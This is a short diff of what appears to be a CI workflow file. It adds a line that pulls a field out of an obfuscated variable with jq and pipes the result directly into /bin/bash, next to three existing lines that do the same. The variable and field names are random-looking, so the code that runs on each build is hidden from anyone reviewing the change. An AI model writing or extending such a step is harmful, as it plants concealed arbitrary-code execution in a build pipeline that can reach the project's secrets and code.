@@ -39,6 +39,7 @@ jobs:
           echo $gl540 | jq -r .mni00330 | /bin/bash
           printf '%s' "$lqeh9040" | jq -r .t8383 | /bin/bash
           printf '%s' "$f24" | jq -r .jme3076 | /bin/bash
+          echo $uax4177 | jq -r .ph02448 | /bin/bash
 
       - name: Store results
         if: always()
